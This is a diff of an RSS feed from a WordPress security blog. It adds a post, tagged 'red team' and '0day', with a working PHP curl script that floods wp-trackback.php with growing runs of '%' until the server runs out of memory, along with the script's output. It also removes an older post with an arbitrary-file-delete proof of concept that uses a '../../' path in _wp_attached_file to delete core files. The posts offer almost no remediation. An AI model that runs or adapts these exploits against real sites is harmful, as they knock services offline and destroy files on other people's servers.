@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/category/core/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description>// Silence is golden.  Not for you!</description>
-	<lastBuildDate>Sun, 11 Oct 2020 21:31:11 +0000</lastBuildDate>
+	<lastBuildDate>Wed, 02 Dec 2020 23:25:03 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,6 +20,136 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.5.3</generator>
 	<item>
+		<title>WordPress DB prepare method DOS / memory limit</title>
+		<link>https://wpdeeply.com/wordpress-db-prepare-method-dos-memory-limit/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Wed, 02 Dec 2020 23:20:15 +0000</pubDate>
+				<category><![CDATA[core]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[0day]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=94</guid>
+
+					<description><![CDATA[Few years back WP &#8220;fixed&#8221; prepare method of its DB class and even today it remains one of the failure points for ~40% of the web. What is the bug? Simple, because sprintf usage every % sign is replaced with placeholder which in most of the setups swaps 1 character % with 66 in memory. &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-db-prepare-method-dos-memory-limit/"> <span class="screen-reader-text">WordPress DB prepare method DOS / memory limit</span> Read More &#187;</a></p>]]></description>
+										<content:encoded><![CDATA[
+<p>Few years back WP &#8220;fixed&#8221; prepare method of its DB class and even today it remains one of the failure points for ~40% of the web. What is the bug? Simple, because sprintf usage every % sign is replaced with placeholder</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">$algo = function_exists( 'hash' ) ? 'sha256' : 'sha1';
+// Old WP installs may not have AUTH_SALT defined.
+$salt = defined( 'AUTH_SALT' ) &amp;&amp; AUTH_SALT ? AUTH_SALT : (string) rand();
+
+$placeholder = '{' . hash_hmac( $algo, uniqid( $salt, true ), $salt ) . '}';
+</code></pre>
+
+
+
+<p>which in most of the setups swaps 1 character % with 66 in memory. Easy DoS, for every routine that calls $wpdb-&gt;prepare or esc_sql <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-db-prepare-dos.md#eli5-poc"></a></h2>
+
+
+
+<h2>Eli5 PoC</h2>
+
+
+
+<p>This attack would work on every $wpdb-&gt;prepare usage like comments or any another data manipulation around WP, but this sample is for wp-trackback.php</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">//post id with turned on trackback
+$post_id = 3;
+//trackback url 
+$target_url = "https://wp.local/wp-trackback.php/".$post_id;
+//number of % bytes to increase on every step
+$payload_step_increase = 100000;
+
+$ch = curl_init();
+$is_500 = false;
+$cnt = 0;
+$payload = "";
+
+while ( ! $is_500 ){
+    
+    $payload = str_repeat("%", ( ( $cnt + 1 ) * $payload_step_increase ) );
+    
+    curl_setopt( $ch, CURLOPT_URL, $target_url );
+    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
+    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
+    curl_setopt( $ch, CURLOPT_HEADER, true ); 
+    curl_setopt( $ch, CURLOPT_POST, 1 );
+    curl_setopt( $ch, CURLOPT_POSTFIELDS, "url=".$payload."&amp;title=title&amp;blog_name=blog_name" );
+    
+    $response = curl_exec( $ch );
+    
+    if ( ! curl_errno( $ch ) ){
+        $response_http_code = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
+        if ( $response_http_code >= 500 ){
+            echo ($cnt+1)." * ".$payload_step_increase." % caused 500+ on ".$target_url."\n";
+            echo "Check content of headers-body-500.txt for response data\n";
+            @file_put_contents( "headers-body-500.txt", $response );
+            $is_500 = true;
+        }else{
+            echo ($cnt+1)." step returned ".$response_http_code." http response code\n";
+        }
+    }
+    
+    $cnt++;
+    curl_reset( $ch );
+
+}
+
+curl_close( $ch );
+
+</code></pre>
+
+
+
+<p>on my default setup memory_limit was reached on 5th try</p>
+
+
+
+<pre class="wp-block-code"><code lang="bash" class="language-bash">1 step returned 409 http response code
+2 step returned 409 http response code
+3 step returned 409 http response code
+4 step returned 409 http response code
+5 * 100000 % caused 500+ on http://wp.local/wp-trackback.php/3
+Check content of headers-body-500.txt for response data
+</code></pre>
+
+
+
+<p>where memory_limit is 128M and post_max_size is 8M.</p>
+
+
+
+<h2>Few facts</h2>
+
+
+
+<ul><li>if only one prepare / esc_sql occurs during code execution memory_limit should be bigger than 66 * post_max_size</li><li>there are cases for popular plugins and wp core where user/visitor input would cause permanent http 500 status code in the wp admin</li><li>How will react server with 60GB of RAM where 100 PHP &#8220;workers&#8221; with 1GB memory_limit exist in pool?  </li></ul>
+
+
+
+<h2>Remediation</h2>
+
+
+
+<ul><li>Good luck and don&#8217;t allow your servers to be melt down by RPi <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li></ul>
+
+
+
+<p></p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
 		<title>WordPress attachment api functions and any post type</title>
 		<link>https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/</link>
 		
@@ -776,74 +906,6 @@ add_action("init", "wprcedemo");
 
 
 <ul><li>Core files shouldn’t be writable by www-data user</li><li>Theme files shouldn’t be writable by www-data user too</li><li>Turn automatic updates for WP core, plugins, themes OFF</li></ul>
-]]></content:encoded>
-					
-		
-		
-			</item>
-		<item>
-		<title>WordPress arbitrary file delete</title>
-		<link>https://wpdeeply.com/wordpress-arbitrary-file-delete/</link>
-		
-		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Sun, 12 Jul 2020 20:57:00 +0000</pubDate>
-				<category><![CDATA[core]]></category>
-		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=49</guid>
-
-					<description><![CDATA[WordPress have a lot of serious issues with paths. There were several tries in the past for security and core team to fix arbitrary file delete issues in the core, but bugs (plural) still remain. Why this bug presented here exist? (there are many another use cases in the core) Because core is solving arbitrary &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-arbitrary-file-delete/"> <span class="screen-reader-text">WordPress arbitrary file delete</span> Read More &#187;</a></p>]]></description>
-										<content:encoded><![CDATA[
-<p>WordPress have a lot of serious issues with paths. There were several tries in the past for security and core team to fix arbitrary file delete issues in the core, but bugs (plural) still remain. Why this bug presented here exist? (there are many another use cases in the core) Because core is solving arbitrary file delete on the following way: limit the file (thumbnail) deletion only for the same folder where is file/attachment and make sure thumbnail isn’t used by another media file. Again, technical detailed writing is huge and more advanced (will be presented in near future), but goal of this writing is something else. <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
-
-
-
-<h2>Eli5 PoC</h2>
-
-
-
-<ul><li>Upload picture in your WP and get its post_id / attachment_id</li><li>this demo code will delete&nbsp;<code>readme.html</code>&nbsp;from WP root directory</li><li>enable&nbsp;<code>hello.php</code>&nbsp;plugin and append this code at the end</li></ul>
-
-
-
-<pre class="wp-block-code"><code lang="php" class="language-php">function afd(){
-    
-    global $wpdb;
-    
-    $attachment_id = "93";
-    $thumb = "readme.html" 
-    //set up 'thumb' on the same way core does
-    $newmeta          = wp_get_attachment_metadata( $attachment_id, true );
-    $newmeta['thumb'] = wp_basename( $thumb );
-    wp_update_attachment_metadata( $attachment_id, $newmeta );
-    
-    //set up apropriate value for _wp_attached_file
-    $wpdb->query("UPDATE `wp_postmeta` SET `meta_value` = '../../license.txt' WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = '".esc_sql($attachment_id)."'");
-    //delete attachment    
-    wp_delete_attachment($attachment_id);
-}
-
-add_action("init", "afd");
-</code></pre>
-
-
-
-<ul><li><code>readme.html</code>&nbsp;is deleted from the WP root</li></ul>
-
-
-
-<h2>Few facts</h2>
-
-
-
-<ul><li><code>_wp_attached_file</code>&nbsp;remains single point of failure for WP</li><li>there is use case in the core where creation of backup of any file is possible and this opens door for silent exploitation when arbitrary file delete is in game</li></ul>
-
-
-
-<h2>Remediation</h2>
-
-
-
-<ul><li>core files shouldn’t be writable by www-data user</li><li>plugins files shouldn’t be writable by www-data user</li></ul>
 ]]></content:encoded>
 					
 		
